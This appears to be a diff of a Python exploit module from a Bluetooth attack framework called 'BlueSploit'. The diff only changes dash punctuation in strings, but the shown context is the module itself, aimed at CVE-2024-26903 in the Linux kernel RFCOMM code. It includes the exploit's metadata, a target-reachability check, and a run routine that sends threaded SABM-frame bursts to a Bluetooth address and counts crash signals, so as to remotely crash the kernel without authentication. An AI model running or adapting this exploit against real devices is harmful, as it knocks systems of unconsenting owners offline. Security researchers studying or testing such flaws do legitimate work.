@@ -55,15 +55,15 @@ class Module(ExploitModule):
     with rapid SABM frames, we force rfcomm_check_security() to
     execute in an unsafe state, dereferencing NULL.
 
-    Impact: Remote kernel crash (NULL deref oops) — no auth required
-    Severity: HIGH — remotely triggerable DoS
+    Impact: Remote kernel crash (NULL deref oops), no auth required
+    Severity: HIGH, remotely triggerable DoS
     """
 
     info = ModuleInfo(
         name="Linux rfcomm_check_security() NULL Deref DoS",
         description=(
             "Remote kernel NULL pointer dereference in rfcomm_check_security() "
-            "(CVE-2024-26903) — no authentication required"
+            "(CVE-2024-26903), no authentication required"
         ),
         author=["BlueSploit"],
         protocol=BTProtocol.CLASSIC,
@@ -108,7 +108,7 @@ class Module(ExploitModule):
 
     def check(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         target = self.get_option("target")
         if not self.validate_bd_addr(target):
@@ -119,7 +119,7 @@ class Module(ExploitModule):
             s.settimeout(5.0)
             s.connect((target, RFCOMM_PSM))
             s.close()
-            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to CVE-2024-26903")
+            print_success(f"RFCOMM PSM reachable, {target} may be vulnerable to CVE-2024-26903")
             return True
         except bluetooth.BluetoothError as e:
             print_error(f"Unreachable: {e}")
@@ -127,7 +127,7 @@ class Module(ExploitModule):
 
     def run(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         if os.geteuid() != 0:
             print_error("Root privileges required")
@@ -148,7 +148,7 @@ class Module(ExploitModule):
         print_info(f"SABM burst  : {sabm_burst} frames per connection")
         print_info("─" * 50)
         print_warning("DISCLAIMER: For authorized security testing only!")
-        print_info("Triggering CVE-2024-26903 — rfcomm_check_security() NULL deref...")
+        print_info("Triggering CVE-2024-26903, rfcomm_check_security() NULL deref...")
 
         stats = {"sent": 0, "errors": 0, "crash_signals": 0}
         per_thread = max(1, attempts // n_threads)
@@ -196,9 +196,9 @@ class Module(ExploitModule):
 
         if stats["crash_signals"] > 0:
             print_success(f"Crash signals detected: {stats['crash_signals']} connection refusals")
-            print_success("Kernel may have crashed — check target dmesg for NULL ptr oops")
+            print_success("Kernel may have crashed, check target dmesg for NULL ptr oops")
         else:
-            print_info("No crash signals — target may be patched or timing needs adjustment")
+            print_info("No crash signals, target may be patched or timing needs adjustment")
 
         self.add_result({
             "target": target,
